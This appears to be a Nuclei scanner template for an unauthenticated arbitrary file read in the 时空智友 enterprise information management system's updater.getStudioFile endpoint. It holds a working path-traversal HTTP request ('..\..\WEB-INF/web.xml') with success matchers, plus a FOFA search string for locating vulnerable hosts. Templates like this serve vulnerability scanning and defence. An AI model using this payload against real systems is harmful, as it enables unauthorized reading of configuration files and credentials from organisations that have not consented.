id: shikongzhiyou-updater_getStudioFile-File-reading

info:
  name: "时空智友企业信息管理系统 updater.getStudioFile 任意文件读取"
  author: Unknown
  severity: high
  description: |-
    fofa: body="时空智友企业信息管理"

    时空智友企业信息管理系统中的 updater.getStudioFile 接口存在任意文件读取漏洞。攻击者无需身份验证即可利用此漏洞访问敏感文件，包括但不限于数据库配置文件和系统配置文件，从而导致系统信息泄露和潜在的安全风险。该漏洞允许远程攻击者通过构造恶意请求读取任意路径文件，可能暴露关键业务数据及系统凭证信息。
  reference:
  - https://mp.weixin.qq.com/s/a2YcdkUH_L-dtosL_yWlBQ
  tags: 时空智友


http:
- raw:
  - |
    POST /formservice?service=updater.getStudioFile HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
    Content-Type: application/json

    ..\..\WEB-INF/web.xml
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - '<?xml version="1.0"'
    - '<web-app'
    - '</web-app>'
    condition: and
  - type: status
    status:
    - 200
